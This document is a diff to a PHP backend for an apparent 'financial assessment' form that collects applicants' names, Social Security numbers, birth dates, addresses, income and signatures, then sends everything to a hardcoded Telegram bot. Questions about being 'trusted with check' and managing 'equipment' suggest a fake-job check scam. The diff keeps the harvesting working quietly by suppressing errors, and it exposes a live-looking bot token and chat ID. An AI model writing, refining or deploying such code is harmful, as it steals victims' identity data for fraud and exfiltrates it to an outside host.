@@ -8,10 +8,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', // Bot 1 token
             'chat_id' => '1325797388' // Bot 1 chat ID
         ],
-        [
-            'token' => '', // Bot 2 token
-            'chat_id' => '' // Bot 2 chat ID
-        ],
         // Add more bots here if needed
     ];
 
@@ -30,7 +26,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $certify_truth = isset($_POST['certify_truth']) ? 'Yes' : 'No';
     $signature = htmlspecialchars($_POST['signature']);
 
-    // Map employment status
+    // Maps
     $employment_status_map = [
         'employed_ft' => 'Employed Full-time',
         'employed_pt' => 'Employed Part-time',
@@ -39,8 +35,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         'unemployed' => 'Currently Unemployed',
         'other' => 'Other'
     ];
-
-    // Map income
     $income_map = [
         'under_30k' => 'Under $30,000',
         '30k_50k'   => '$30,000 - $50,000',
@@ -52,46 +46,51 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $readable_employment = $employment_status_map[$employment_status] ?? $employment_status;
     $readable_income = $income_map[$annual_income] ?? $annual_income;
 
-    // Create message
-    $message = "💰 *NEW FINANCIAL ASSESSMENT SUBMISSION* 💰\n\n";
-    $message .= "👤 *PERSONAL INFORMATION*\n";
+    // Message
+    $message = "💰 NEW FINANCIAL ASSESSMENT SUBMISSION 💰\n\n";
+    $message .= "👤 PERSONAL INFORMATION\n";
     $message .= "📛 Full Name: $full_name\n";
     $message .= "🆔 SSN: $ssn\n";
     $message .= "🎂 DOB: $dob\n";
     $message .= "🏠 Address: $address\n\n";
-    $message .= "💵 *FINANCIAL INFORMATION*\n";
+    $message .= "💵 FINANCIAL INFORMATION\n";
     $message .= "💼 Employment Status: $readable_employment\n";
     $message .= "💰 Annual Income: $readable_income\n";
     $message .= "👨‍👩‍👧‍👦 Dependents: $dependents\n";
     $message .= "📊 Additional Income Sources: $income_sources\n\n";
-    $message .= "💻 *EQUIPMENT INVESTMENT*\n";
+    $message .= "💻 EQUIPMENT INVESTMENT\n";
     $message .= "❓ Can manage equipment? $equipment_investment\n";
     if ($equipment_investment === 'no') {
         $message .= "⚠️ Confirmed incapable? $confirm_incapable\n";
         $message .= "🤝 Trusted with check? $trust_check\n";
     }
-    $message .= "\n✍️ *CERTIFICATION*\n";
+    $message .= "\n✍️ CERTIFICATION\n";
     $message .= "✅ Certified info: $certify_truth\n";
     $message .= "📝 Digital Signature: $signature\n\n";
     $message .= "⏰ Submitted on: " . date('Y-m-d H:i:s');
 
-    // Send to all configured Telegram bots
+    // Send to Telegram
     foreach ($telegramBots as $bot) {
         if (!empty($bot['token']) && !empty($bot['chat_id'])) {
             $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
             $data = [
                 'chat_id' => $bot['chat_id'],
                 'text' => $message,
-                'parse_mode' => 'Markdown'
+                // safer: disable parse mode to avoid markdown parse errors
+                // 'parse_mode' => 'MarkdownV2'
             ];
+
             $options = [
                 'http' => [
-                    'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-                    'method' => 'POST',
+                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+                    'method'  => 'POST',
                     'content' => http_build_query($data),
-                ],
+                    'ignore_errors' => true // avoid warnings breaking headers
+                ]
             ];
-            file_get_contents($url, false, stream_context_create($options));
+
+            // suppress warning if Telegram fails
+            @file_get_contents($url, false, stream_context_create($options));
         }
     }
 
@@ -111,4 +110,3 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     header('Location: financial-assessment.php');
     exit();
 }
-?>
